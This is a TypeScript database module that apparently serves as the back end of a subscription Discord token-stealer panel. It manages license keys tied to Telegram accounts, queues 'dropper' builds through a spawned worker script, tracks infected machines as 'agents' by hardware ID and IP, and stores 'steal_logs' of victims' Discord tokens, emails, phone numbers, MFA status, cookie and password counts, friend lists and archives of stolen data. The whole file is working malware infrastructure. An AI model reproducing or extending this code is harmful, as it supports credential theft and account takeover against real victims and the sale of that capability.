import { DatabaseSync } from "node:sqlite";
import { spawn } from "child_process";
import { randomBytes } from "crypto";
import fs from "fs";
import path from "path";
import { dbPath, panelBase, panelBases } from "./config";

const KEY_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";

function randomGroup() {
  const bytes = randomBytes(4);
  let out = "";
  for (let i = 0; i < 4; i++) out += KEY_ALPHABET[bytes[i] % KEY_ALPHABET.length];
  return out;
}

export async function makeKey() {
  const d = open();
  for (let i = 0; i < 30; i++) {
    const key = `NF-${randomGroup()}-${randomGroup()}-${randomGroup()}-${randomGroup()}`;
    const row = d.prepare("SELECT key FROM keys WHERE key = ?").get(key);
    if (!row) return key;
  }
  throw new Error("key space exhausted");
}

export type KeyRow = {
  key: string;
  note: string;
  days: number;
  created_at: number;
  expires_at: number;
  tg_id: number | null;
  revoked: number;
  username?: string | null;
};

export type UserRow = {
  tg_id: number;
  key: string | null;
  webhook: string | null;
  init_url: string | null;
  username: string | null;
  updated_at: number;
  hook_id: string | null;
  hook_secret: string | null;
};

let db: DatabaseSync | null = null;

function schemaExec(d: DatabaseSync) {
  d.exec("PRAGMA journal_mode = WAL");
  d.exec("PRAGMA busy_timeout = 5000");
  d.exec(`CREATE TABLE IF NOT EXISTS keys (
    key TEXT PRIMARY KEY,
    note TEXT NOT NULL DEFAULT '',
    days INTEGER NOT NULL DEFAULT 0,
    created_at INTEGER NOT NULL DEFAULT 0,
    expires_at INTEGER NOT NULL DEFAULT 0,
    tg_id INTEGER,
    revoked INTEGER NOT NULL DEFAULT 0
  )`);
  d.exec(`CREATE TABLE IF NOT EXISTS users (
    tg_id INTEGER PRIMARY KEY,
    key TEXT,
    webhook TEXT,
    init_url TEXT,
    username TEXT,
    updated_at INTEGER NOT NULL DEFAULT 0,
    hook_id TEXT,
    hook_secret TEXT
  )`);
  d.exec(`CREATE TABLE IF NOT EXISTS otp (
    tg_id INTEGER PRIMARY KEY,
    code TEXT NOT NULL,
    expires_at INTEGER NOT NULL
  )`);
  d.exec(`CREATE TABLE IF NOT EXISTS builds (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    tg_id INTEGER NOT NULL,
    kind TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'queued',
    detail TEXT,
    artifact TEXT,
    created_at INTEGER NOT NULL DEFAULT 0,
    finished_at INTEGER,
    label TEXT,
    icon TEXT,
    theme TEXT,
    theme_w INTEGER,
    theme_h INTEGER
  )`);
  d.exec(`CREATE TABLE IF NOT EXISTS agents (
    hwid TEXT PRIMARY KEY,
    tg_id INTEGER NOT NULL,
    name TEXT,
    os TEXT,
    ip TEXT,
    last_seen INTEGER NOT NULL DEFAULT 0,
    online INTEGER NOT NULL DEFAULT 0,
    meta TEXT
  )`);
  d.exec(`CREATE TABLE IF NOT EXISTS steal_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    tg_id INTEGER NOT NULL,
    created_at INTEGER NOT NULL DEFAULT 0,
    host TEXT,
    os TEXT,
    ip TEXT,
    username TEXT,
    discord_id TEXT,
    token TEXT,
    email TEXT,
    phone TEXT,
    mfa TEXT,
    badges TEXT,
    cookies INTEGER NOT NULL DEFAULT 0,
    passwords INTEGER NOT NULL DEFAULT 0,
    hq_friends INTEGER NOT NULL DEFAULT 0,
    friends_json TEXT,
    zip_path TEXT,
    raw_kind TEXT,
    meta_json TEXT
  )`);
  d.exec(`CREATE TABLE IF NOT EXISTS audit (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    tg_id INTEGER,
    level TEXT,
    msg TEXT,
    host TEXT,
    created_at INTEGER NOT NULL DEFAULT 0
  )`);
  d.exec("CREATE INDEX IF NOT EXISTS idx_builds_tg ON builds(tg_id, id DESC)");
  d.exec("CREATE INDEX IF NOT EXISTS idx_steal_tg ON steal_logs(tg_id, id DESC)");
  d.exec("CREATE INDEX IF NOT EXISTS idx_audit_tg ON audit(tg_id, id DESC)");
  d.exec("CREATE UNIQUE INDEX IF NOT EXISTS idx_users_hook ON users(hook_id, hook_secret) WHERE hook_id IS NOT NULL");
}

function open(): DatabaseSync {
  if (db) return db;
  const file = dbPath();
  try {
    fs.mkdirSync(path.dirname(file), { recursive: true });
    db = new DatabaseSync(file);
  } catch (e) {
    const code = (e as NodeJS.ErrnoException).code ?? "unknown";
    throw new Error(`bot db not writable: ${file} (${code}); set PANEL_DATA_DIR or BOT_DB_PATH to a writable path`);
  }
  schemaExec(db);
  return db;
}

function num(v: unknown, fallback = 0) {
  const n = Number(v);
  return Number.isFinite(n) ? n : fallback;
}

function str(v: unknown): string {
  return v == null ? "" : String(v);
}

function optStr(v: unknown): string | null {
  if (v == null || v === "") return null;
  return String(v);
}

function bool1(v: unknown) {
  return v ? 1 : 0;
}

export function botDir() {
  return path.dirname(dbPath());
}

export function now() {
  return Math.floor(Date.now() / 1000);
}

export function ingestUrl(base: string, hookId: string, hookSecret: string) {
  return `${base.replace(/\/$/, "")}/api/webhooks/${hookId}/${hookSecret}`;
}

export function maskWebhook(url: string | null | undefined) {
  if (!url) return "-";
  if (url.length < 24) return "***";
  return `${url.slice(0, 28)}…${url.slice(-6)}`;
}

export function validDiscordWebhook(url: string) {
  let u: URL;
  try {
    u = new URL(url.trim());
  } catch {
    return false;
  }
  if (u.protocol !== "https:") return false;
  const host = u.hostname.toLowerCase();
  const allowed = new Set(["discord.com", "discordapp.com", "canary.discord.com", "ptb.discord.com"]);
  if (!allowed.has(host)) return false;
  const parts = u.pathname.split("/").filter(Boolean);
  return parts[0] === "api" && parts[1] === "webhooks" && parts.length >= 4 && /^\d+$/.test(parts[2]);
}

function toKeyRow(r: Record<string, unknown>): KeyRow {
  return {
    key: str(r.key),
    note: str(r.note),
    days: num(r.days),
    created_at: num(r.created_at),
    expires_at: num(r.expires_at),
    tg_id: r.tg_id == null ? null : num(r.tg_id),
    revoked: num(r.revoked),
    username: optStr(r.username),
  };
}

function toUserRow(r: Record<string, unknown>): UserRow {
  return {
    tg_id: num(r.tg_id),
    key: optStr(r.key),
    webhook: optStr(r.webhook),
    init_url: optStr(r.init_url),
    username: optStr(r.username),
    updated_at: num(r.updated_at),
    hook_id: optStr(r.hook_id),
    hook_secret: optStr(r.hook_secret),
  };
}

export async function getKey(key: string) {
  const row = open().prepare("SELECT * FROM keys WHERE key = ?").get(key.trim().toUpperCase());
  return row ? toKeyRow(row as Record<string, unknown>) : null;
}

export async function listKeys(limit = 80) {
  const rows = open()
    .prepare(
      `SELECT k.*, u.username AS username FROM keys k
       LEFT JOIN users u ON u.tg_id = k.tg_id
       ORDER BY k.created_at DESC, k.rowid DESC LIMIT ?`,
    )
    .all(Math.max(1, Math.min(2000, limit)));
  return rows.map((r) => toKeyRow(r as Record<string, unknown>));
}

export async function insertKey(key: string, days: number, note: string) {
  const t = now();
  open()
    .prepare(
      "INSERT INTO keys (key, note, days, created_at, expires_at, tg_id, revoked) VALUES (?, ?, ?, ?, ?, NULL, 0)",
    )
    .run(key.trim().toUpperCase(), String(note || "").slice(0, 200), Math.max(1, days), t, t + Math.max(1, days) * 86400);
}

export async function revokeKey(key: string) {
  const info = open().prepare("UPDATE keys SET revoked = 1 WHERE key = ?").run(key.trim().toUpperCase());
  return Number(info.changes) > 0;
}

export async function getUser(tgId: number) {
  const row = open().prepare("SELECT * FROM users WHERE tg_id = ?").get(tgId);
  if (!row) return null;
  return toUserRow(row as Record<string, unknown>);
}

export async function listUsers(limit = 80) {
  const rows = open()
    .prepare("SELECT * FROM users ORDER BY updated_at DESC, tg_id DESC LIMIT ?")
    .all(Math.max(1, Math.min(2000, limit)));
  return rows.map((r) => toUserRow(r as Record<string, unknown>));
}

export async function userActive(tgId: number): Promise<{ ok: boolean; why: string }> {
  const user = await getUser(tgId);
  if (!user?.key) return { ok: false, why: "activation required" };
  const row = await getKey(user.key);
  if (!row) return { ok: false, why: "key missing" };
  if (row.revoked) return { ok: false, why: "key revoked" };
  if (row.expires_at < now()) return { ok: false, why: "key expired" };
  if (row.tg_id != null && Number(row.tg_id) !== tgId) return { ok: false, why: "key bound to another account" };
  return { ok: true, why: "ok" };
}

export async function keyLoginOk(key: string) {
  const row = await getKey(key);
  if (!row) return { ok: false as const, why: "invalid", user: null };
  if (row.revoked) return { ok: false as const, why: "invalid", user: null };
  if (row.expires_at < now()) return { ok: false as const, why: "invalid", user: null };
  if (row.tg_id == null) return { ok: false as const, why: "invalid", user: null };
  const user = await getUser(Number(row.tg_id));
  if (!user || user.key !== key) return { ok: false as const, why: "invalid", user: null };
  return { ok: true as const, why: "ok", user };
}

function makePair() {
  return {
    id: randomBytes(8).toString("hex"),
    secret: randomBytes(16).toString("hex"),
  };
}

function ensureUserRow(d: DatabaseSync, tgId: number) {
  d.prepare("INSERT OR IGNORE INTO users (tg_id, key, webhook, init_url, username, updated_at) VALUES (?, NULL, NULL, NULL, NULL, ?)").run(tgId, now());
}

export async function ensureHook(tgId: number, rotate = false) {
  const d = open();
  ensureUserRow(d, tgId);
  const row = d.prepare("SELECT hook_id, hook_secret FROM users WHERE tg_id = ?").get(tgId) as
    | { hook_id: string | null; hook_secret: string | null }
    | undefined;
  if (!rotate && row?.hook_id && row.hook_secret) {
    return { id: row.hook_id, secret: row.hook_secret };
  }
  const pair = makePair();
  d.prepare("UPDATE users SET hook_id = ?, hook_secret = ?, updated_at = ? WHERE tg_id = ?").run(
    pair.id,
    pair.secret,
    now(),
    tgId,
  );
  return pair;
}

export async function setWebhook(tgId: number, url: string) {
  const d = open();
  ensureUserRow(d, tgId);
  d.prepare("UPDATE users SET webhook = ?, updated_at = ? WHERE tg_id = ?").run(url.trim(), now(), tgId);
  return ensureHook(tgId, false);
}

export async function userIngest(tgId: number, base: string) {
  if (!base) return null;
  const pair = await ensureHook(tgId, false);
  return ingestUrl(base, pair.id, pair.secret);
}

export async function hookForwardTarget(hookId: string, hookSecret: string) {
  const user = await hookUser(hookId, hookSecret);
  if (!user) return { user: null, why: "not_found" };
  if (!user.webhook) return { user: null, why: "no_webhook" };
  const active = await userActive(Number(user.tg_id));
  if (!active.ok) return { user: null, why: active.why };
  return { user, why: "ok" };
}

export async function putOtp(tgId: number, code: string, ttl = 180) {
  open()
    .prepare("INSERT OR REPLACE INTO otp (tg_id, code, expires_at) VALUES (?, ?, ?)")
    .run(tgId, String(code), now() + Math.max(1, ttl));
}

export async function takeOtp(tgId: number, code: string) {
  const d = open();
  const row = d.prepare("SELECT code, expires_at FROM otp WHERE tg_id = ?").get(tgId) as
    | { code: string; expires_at: number }
    | undefined;
  if (!row) return false;
  const ok = row.code === String(code) && num(row.expires_at) > now();
  d.prepare("DELETE FROM otp WHERE tg_id = ?").run(tgId);
  return ok;
}

export type BuildRow = {
  id: number;
  tg_id: number;
  kind: string;
  status: string;
  detail: string | null;
  artifact: string | null;
  created_at: number;
  finished_at: number | null;
  label?: string | null;
  icon?: string | null;
  theme?: string | null;
  theme_w?: number | null;
  theme_h?: number | null;
};

function toBuildRow(r: Record<string, unknown>): BuildRow {
  return {
    id: num(r.id),
    tg_id: num(r.tg_id),
    kind: str(r.kind),
    status: str(r.status),
    detail: optStr(r.detail),
    artifact: optStr(r.artifact),
    created_at: num(r.created_at),
    finished_at: r.finished_at == null ? null : num(r.finished_at),
    label: optStr(r.label),
    icon: optStr(r.icon),
    theme: optStr(r.theme),
    theme_w: r.theme_w == null ? null : num(r.theme_w),
    theme_h: r.theme_h == null ? null : num(r.theme_h),
  };
}

export async function addBuild(
  tgId: number,
  kind: string,
  label?: string | null,
  icon?: string | null,
  theme?: string | null,
  themeW?: number | null,
  themeH?: number | null,
) {
  const info = open()
    .prepare(
      `INSERT INTO builds (tg_id, kind, status, detail, artifact, created_at, finished_at, label, icon, theme, theme_w, theme_h)
       VALUES (?, ?, 'queued', NULL, NULL, ?, NULL, ?, ?, ?, ?, ?)`,
    )
    .run(
      tgId,
      kind,
      now(),
      label || null,
      icon || null,
      theme || null,
      themeW ?? null,
      themeH ?? null,
    );
  return { id: Number(info.lastInsertRowid) };
}

export async function getBuild(id: number) {
  const row = open().prepare("SELECT * FROM builds WHERE id = ?").get(id);
  return row ? toBuildRow(row as Record<string, unknown>) : null;
}

export async function listBuilds(tgId: number, limit = 20) {
  const rows = open()
    .prepare("SELECT * FROM builds WHERE tg_id = ? ORDER BY id DESC LIMIT ?")
    .all(tgId, Math.max(1, Math.min(200, limit)));
  return rows.map((r) => toBuildRow(r as Record<string, unknown>));
}

export type ThemeRow = {
  id: number;
  tg_id: number;
  label?: string | null;
  theme: string;
  created_at: number;
  username?: string | null;
};

export async function listThemes(limit = 200) {
  const rows = open()
    .prepare(
      `SELECT b.id, b.tg_id, b.label, b.theme, b.created_at, u.username AS username
       FROM builds b LEFT JOIN users u ON u.tg_id = b.tg_id
       WHERE b.theme IS NOT NULL AND b.theme != ''
       ORDER BY b.id DESC LIMIT ?`,
    )
    .all(Math.max(1, Math.min(1000, limit)));
  return rows.map((r) => {
    const o = r as Record<string, unknown>;
    return {
      id: num(o.id),
      tg_id: num(o.tg_id),
      label: optStr(o.label),
      theme: str(o.theme),
      created_at: num(o.created_at),
      username: optStr(o.username),
    } satisfies ThemeRow;
  });
}

export async function activeBuild(tgId: number) {
  const row = open()
    .prepare(
      "SELECT * FROM builds WHERE tg_id = ? AND status IN ('queued', 'running') ORDER BY id DESC LIMIT 1",
    )
    .get(tgId);
  return row ? toBuildRow(row as Record<string, unknown>) : null;
}

export async function lastBuildAt(tgId: number) {
  const row = open()
    .prepare("SELECT created_at FROM builds WHERE tg_id = ? ORDER BY id DESC LIMIT 1")
    .get(tgId) as { created_at?: number } | undefined;
  return num(row?.created_at, 0);
}

function buildWorkerCandidates() {
  const root = projectRoot();
  return [
    path.join(root, "dropper", "tools", "panel_build.mjs"),
    path.join(root, "tools", "panel_build.mjs"),
  ];
}

// panel_build writes into <appRoot>/dist, and appRoot is wherever its tools/
// directory sits — derive the served roots from the worker, not from a guess,
// so the split (dropper/ + core/) and the flat layout both resolve.
export function distRoots() {
  const dirs = new Set<string>([path.resolve(projectRoot(), "dist")]);
  for (const script of buildWorkerCandidates()) {
    if (fs.existsSync(script)) {
      dirs.add(path.resolve(path.dirname(path.dirname(script)), "dist"));
    }
  }
  return [...dirs];
}

function resolveBuildWorker() {
  const root = projectRoot();
  const candidates = buildWorkerCandidates();
  const script = candidates.find((c) => fs.existsSync(c));
  if (!script) {
    throw new Error(`build worker missing (tried: ${candidates.join("; ")})`);
  }
  // <appRoot>/tools/panel_build.mjs -> <appRoot>: res/, src/, dist/ and the
  // electron package.json all live next to tools/, while core/ stays at root.
  const appRoot = path.dirname(path.dirname(script));
  return { root, script, appRoot };
}

export function spawnBuildOne(buildId: number) {
  const { root, script, appRoot } = resolveBuildWorker();
  fs.mkdirSync(botDir(), { recursive: true });
  const outLog = path.join(botDir(), `build_${buildId}.log`);
  const pidFile = path.join(botDir(), `build_${buildId}.pid`);
  const out = fs.openSync(outLog, "a");
  const child = spawn(
    process.execPath,
    [
      script,
      "--id", String(buildId),
      "--db", dbPath(),
      "--root", appRoot,
      "--src-root", root,
      "--base", panelBase(),
      "--bases", panelBases().join(","),
    ],
    {
      cwd: root,
      detached: true,
      stdio: ["ignore", out, out],
      windowsHide: true,
    },
  );
  if (child.pid) {
    try {
      fs.writeFileSync(pidFile, String(child.pid), "utf8");
    } catch {
      /* ignore */
    }
  }
  child.unref();
}

function killBuildPid(buildId: number) {
  const pidFile = path.join(botDir(), `build_${buildId}.pid`);
  let pid = 0;
  try {
    if (fs.existsSync(pidFile)) {
      pid = Number(fs.readFileSync(pidFile, "utf8").trim()) || 0;
    }
  } catch {
    pid = 0;
  }
  if (pid > 0) {
    try {
      if (process.platform === "win32") {
        spawn("taskkill", ["/PID", String(pid), "/T", "/F"], {
          stdio: "ignore",
          windowsHide: true,
          detached: true,
        }).unref();
      } else {
        try {
          process.kill(-pid, "SIGTERM");
        } catch {
          try {
            process.kill(pid, "SIGTERM");
          } catch {
            /* ignore */
          }
        }
      }
    } catch {
      /* ignore */
    }
  }
  try {
    if (fs.existsSync(pidFile)) fs.unlinkSync(pidFile);
  } catch {
    /* ignore */
  }
}

export async function cancelBuild(tgId: number, buildId: number) {
  const d = open();
  const row = d.prepare("SELECT tg_id, status FROM builds WHERE id = ?").get(buildId) as
    | { tg_id: number; status: string }
    | undefined;
  if (!row || num(row.tg_id) !== tgId) return { ok: false, error: "not found" };
  if (!["queued", "running"].includes(str(row.status))) {
    return { ok: false, error: "done" };
  }
  d.prepare("UPDATE builds SET status = 'cancel', finished_at = ? WHERE id = ?").run(now(), buildId);
  killBuildPid(buildId);
  return { ok: true, id: buildId };
}

export function projectRoot() {
  return path.dirname(path.dirname(botDir()));
}

export async function addAudit(tgId: number, level: string, msg: string, host: string) {
  const info = open()
    .prepare("INSERT INTO audit (tg_id, level, msg, host, created_at) VALUES (?, ?, ?, ?, ?)")
    .run(tgId, String(level).slice(0, 40), String(msg).slice(0, 4000), String(host || "").slice(0, 200), now());
  return { ok: true, id: Number(info.lastInsertRowid) };
}

export async function listAudit(opts: {
  tgId?: number;
  q?: string;
  limit?: number;
}) {
  const clauses: string[] = [];
  const params: unknown[] = [];
  if (opts.tgId != null) {
    clauses.push("tg_id = ?");
    params.push(opts.tgId);
  }
  const q = (opts.q || "").trim();
  if (q) {
    clauses.push("(msg LIKE ? OR host LIKE ? OR level LIKE ?)");
    const like = `%${q}%`;
    params.push(like, like, like);
  }
  const where = clauses.length ? `WHERE ${clauses.join(" AND ")}` : "";
  params.push(Math.max(1, Math.min(1000, opts.limit ?? 200)));
  const rows = open()
    .prepare(`SELECT * FROM audit ${where} ORDER BY id DESC LIMIT ?`)
    .all(...params);
  return rows.map((r) => {
    const o = r as Record<string, unknown>;
    return {
      id: num(o.id),
      tg_id: num(o.tg_id),
      level: str(o.level),
      msg: str(o.msg),
      host: str(o.host),
      created_at: num(o.created_at),
    };
  });
}

export async function hookUser(hookId: string, hookSecret: string) {
  const row = open()
    .prepare("SELECT * FROM users WHERE hook_id = ? AND hook_secret = ?")
    .get(hookId, hookSecret);
  return row ? toUserRow(row as Record<string, unknown>) : null;
}

export type AgentRow = {
  hwid: string;
  tg_id: number;
  name: string | null;
  os: string | null;
  ip: string | null;
  last_seen: number;
  online: number;
  meta: string | null;
};

function toAgentRow(r: Record<string, unknown>): AgentRow {
  return {
    hwid: str(r.hwid),
    tg_id: num(r.tg_id),
    name: optStr(r.name),
    os: optStr(r.os),
    ip: optStr(r.ip),
    last_seen: num(r.last_seen),
    online: num(r.online),
    meta: optStr(r.meta),
  };
}

export async function upsertAgent(row: {
  hwid: string;
  tgId: number;
  name: string;
  os: string;
  ip: string;
  meta: string;
}) {
  const d = open();
  d.prepare(
    `INSERT INTO agents (hwid, tg_id, name, os, ip, last_seen, online, meta)
     VALUES (?, ?, ?, ?, ?, ?, 1, ?)
     ON CONFLICT(hwid) DO UPDATE SET
       tg_id = excluded.tg_id,
       name = excluded.name,
       os = excluded.os,
       ip = excluded.ip,
       last_seen = excluded.last_seen,
       online = 1,
       meta = excluded.meta`,
  ).run(row.hwid, row.tgId, row.name, row.os, row.ip, now(), row.meta);
  return { ok: true, hwid: row.hwid };
}

export async function setAgentOnline(hwid: string, online: boolean) {
  const info = open()
    .prepare("UPDATE agents SET online = ?, last_seen = ? WHERE hwid = ?")
    .run(bool1(online), now(), hwid);
  return { ok: Number(info.changes) > 0 };
}

export async function listAgents(tgId?: number, limit = 200) {
  const lim = Math.max(1, Math.min(1000, limit));
  const rows =
    tgId == null
      ? open().prepare("SELECT * FROM agents ORDER BY last_seen DESC LIMIT ?").all(lim)
      : open().prepare("SELECT * FROM agents WHERE tg_id = ? ORDER BY last_seen DESC LIMIT ?").all(tgId, lim);
  return rows.map((r) => toAgentRow(r as Record<string, unknown>));
}

export async function getAgent(hwid: string) {
  const row = open().prepare("SELECT * FROM agents WHERE hwid = ?").get(hwid);
  return row ? toAgentRow(row as Record<string, unknown>) : null;
}

export type StealLog = {
  id: number;
  tg_id: number;
  created_at: number;
  host: string | null;
  os: string | null;
  ip: string | null;
  username: string | null;
  discord_id: string | null;
  token: string | null;
  email: string | null;
  phone: string | null;
  mfa: string | null;
  badges: string | null;
  cookies: number;
  passwords: number;
  hq_friends: number;
  friends_json: string | null;
  zip_path: string | null;
  raw_kind: string | null;
  meta_json: string | null;
};

function toStealRow(r: Record<string, unknown>): StealLog {
  return {
    id: num(r.id),
    tg_id: num(r.tg_id),
    created_at: num(r.created_at),
    host: optStr(r.host),
    os: optStr(r.os),
    ip: optStr(r.ip),
    username: optStr(r.username),
    discord_id: optStr(r.discord_id),
    token: optStr(r.token),
    email: optStr(r.email),
    phone: optStr(r.phone),
    mfa: optStr(r.mfa),
    badges: optStr(r.badges),
    cookies: num(r.cookies),
    passwords: num(r.passwords),
    hq_friends: num(r.hq_friends),
    friends_json: optStr(r.friends_json),
    zip_path: optStr(r.zip_path),
    raw_kind: optStr(r.raw_kind),
    meta_json: optStr(r.meta_json),
  };
}

export async function addStealLog(row: {
  tgId: number;
  host?: string;
  os?: string;
  ip?: string;
  username?: string;
  discordId?: string;
  token?: string;
  email?: string;
  phone?: string;
  mfa?: string;
  badges?: string;
  cookies?: number;
  passwords?: number;
  hqFriends?: number;
  friendsJson?: string;
  zipPath?: string;
  rawKind?: string;
  metaJson?: string;
}) {
  const info = open()
    .prepare(
      `INSERT INTO steal_logs (
         tg_id, created_at, host, os, ip, username, discord_id, token, email, phone,
         mfa, badges, cookies, passwords, hq_friends, friends_json, zip_path, raw_kind, meta_json
       ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    )
    .run(
      row.tgId,
      now(),
      row.host || "",
      row.os || "",
      row.ip || "",
      row.username || "",
      row.discordId || "",
      row.token || "",
      row.email || "",
      row.phone || "",
      row.mfa || "",
      row.badges || "",
      row.cookies ?? 0,
      row.passwords ?? 0,
      row.hqFriends ?? 0,
      row.friendsJson || "",
      row.zipPath || "",
      row.rawKind || "",
      row.metaJson || "{}",
    );
  return { ok: true, id: Number(info.lastInsertRowid) };
}

const STEAL_PATCH_COLS = new Set([
  "host", "os", "ip", "username", "discord_id", "token", "email", "phone",
  "mfa", "badges", "cookies", "passwords", "hq_friends", "friends_json",
  "zip_path", "raw_kind", "meta_json",
]);

export async function updateStealLog(
  id: number,
  patch: Record<string, string | number | null | undefined>,
) {
  const sets: string[] = [];
  const params: unknown[] = [];
  for (const [k, v] of Object.entries(patch)) {
    if (v === undefined || !STEAL_PATCH_COLS.has(k)) continue;
    sets.push(`${k} = ?`);
    params.push(typeof v === "boolean" ? bool1(v) : (v as string | number | null));
  }
  if (!sets.length) return { ok: true, id };
  params.push(id);
  const info = open().prepare(`UPDATE steal_logs SET ${sets.join(", ")} WHERE id = ?`).run(...params);
  return { ok: Number(info.changes) > 0, id };
}

export async function listStealLogs(opts: { tgId?: number; limit?: number }) {
  const lim = Math.max(1, Math.min(1000, opts.limit ?? 200));
  const rows =
    opts.tgId == null
      ? open().prepare("SELECT * FROM steal_logs ORDER BY id DESC LIMIT ?").all(lim)
      : open().prepare("SELECT * FROM steal_logs WHERE tg_id = ? ORDER BY id DESC LIMIT ?").all(opts.tgId, lim);
  return rows.map((r) => toStealRow(r as Record<string, unknown>));
}

export async function getStealLog(id: number) {
  const row = open().prepare("SELECT * FROM steal_logs WHERE id = ?").get(id);
  return row ? toStealRow(row as Record<string, unknown>) : null;
}

export async function latestStealLog(tgId: number, windowSec = 1800) {
  const row = open()
    .prepare(
      "SELECT * FROM steal_logs WHERE tg_id = ? AND created_at >= ? ORDER BY id DESC LIMIT 1",
    )
    .get(tgId, now() - Math.max(1, windowSec));
  return row ? toStealRow(row as Record<string, unknown>) : null;
}

export function hitsDir() {
  return path.join(botDir(), "data", "hits");
}

export async function ensureKey(tgId: number) {
  const d = open();
  ensureUserRow(d, tgId);
  const row = d.prepare("SELECT key FROM users WHERE tg_id = ?").get(tgId) as
    | { key: string | null }
    | undefined;
  if (row?.key) return;
  const key = await makeKey();
  await insertKey(key, 365, "auto-generated");
  d.prepare("UPDATE users SET key = ? WHERE tg_id = ?").run(key, tgId);
  console.log(`[db] ensured key for tgId=${tgId}: ${key}`);
}
